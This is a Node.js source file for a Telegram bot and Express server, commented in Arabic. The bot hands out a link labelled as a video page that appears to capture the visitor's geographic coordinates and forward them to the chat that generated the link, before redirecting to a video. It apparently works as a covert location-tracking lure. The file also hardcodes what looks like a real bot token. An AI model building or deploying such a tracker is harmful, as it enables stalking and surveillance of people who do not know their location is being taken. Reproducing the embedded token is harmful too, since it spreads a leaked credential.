const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const botToken = '7533131320:AAHKwbr-cLxTSEFmD9pQ0P7xFy11uybUkq0'; // تأكد من استخدام توكن البوت الخاص بك
const bot = new TelegramBot(botToken, { polling: true });
const app = express();
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' })); // زيادة الحد الأقصى لحجم الطلب

const dataStore = {}; // لتخزين المعلومات المؤقتة

app.use(express.static(__dirname));

app.post('/submitLocation', (req, res) => {
    const chatId = req.body.chatId;
    const latitude = req.body.latitude;
    const longitude = req.body.longitude;

    // حفظ البيانات الجديدة
    dataStore[chatId] = { latitude, longitude };

    // إرسال الموقع
    bot.sendLocation(chatId, latitude, longitude);

    console.log(`Stored location data for chatId ${chatId}`);

    res.redirect('/video'); // إعادة التوجيه إلى صفحة الفيديو
});

app.get('/getVideo', (req, res) => {
    res.sendFile(path.join(__dirname, 'location.html'));
});

app.get('/video', (req, res) => {
    res.sendFile(path.join(__dirname, 'video.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const message = 'مرحبًا! انقر على الرابط للحصول على موقعك.';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'الحصول على الموقع', url: `https://colossal-nifty-hisser.glitch.me/getVideo?chatId=${chatId}` }]
            ]
        }
    });
});